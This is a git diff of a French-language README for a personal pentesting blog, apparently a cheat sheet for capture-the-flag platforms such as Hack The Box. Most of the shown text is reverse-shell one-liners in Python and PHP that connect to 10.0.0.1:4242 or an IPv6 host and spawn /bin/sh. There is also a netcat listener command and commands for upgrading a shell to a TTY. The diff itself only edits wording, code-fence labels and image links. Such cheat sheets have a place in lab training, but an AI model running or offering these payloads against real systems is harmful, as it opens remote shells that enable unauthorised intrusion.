@@ -1,5 +1,5 @@
 # Xender ?
-Bienvenue sur mon blog GitHub, ou je publie mes multiple Scripts et programmes liée à la CyberSec, test et explication de nouvelles menace [CVE](https://cve.mitre.org/) il represente une aide memoire et bien plus. Vous pouvez me contacter et savoir plus sur mes réseaux [Facebook](https://www.facebook.com/Ghiles.MAHLEB/ "Facebook"), [Linkedin](https://www.linkedin.com/in/ghiles-mahleb-600619188/ "Linkedin").
+Bienvenue sur mon blog GitHub, ou je publie mes multiple Scripts et programmes liée à la CyberSec, exploitation et explication de nouvelles [CVE](https://cve.mitre.org/) le bolg represente une aide memoire et bien plus. Vous pouvez me contacter et savoir plus sur mes réseaux [Facebook](https://www.facebook.com/Ghiles.MAHLEB/ "Facebook"), [Linkedin](https://www.linkedin.com/in/ghiles-mahleb-600619188/ "Linkedin").
 
 La plupart des pentest vont se faire sur des plateforme comme [HTB](https://app.hackthebox.eu/ "Hack The Box"), [THM](https://tryhackme.com/ "TryHackMe"). vous pouvez me trouver aussi sur [Hack The Box](https://app.hackthebox.eu/profile/240886 "Xender")
 
@@ -24,21 +24,21 @@ nc -lnvp 1290
 Linux only
 
 IPv4
-```python
+```bash
 export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 ```
 
 IPv4
-```python
+```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
 IPv6
-```python
+```bash
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
 
-```python
+```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
@@ -107,6 +107,10 @@ php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 
 Spawner la TTY apres avoir eu un accès
 
+
+![](https://xnderlan.github.io/Xender/img/spawn.jpg)
+
+
 ```powershell
 /bin/sh -i
 python3 -c 'import pty; pty.spawn("/bin/sh")'
@@ -118,4 +122,10 @@ perl -e 'print `/bin/bash`'
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 ```
+
+## 1.3 Python
+
+![](https://xnderlan.github.io/Xender/py.jpg)
+
+### 1.3.1 Basique
 
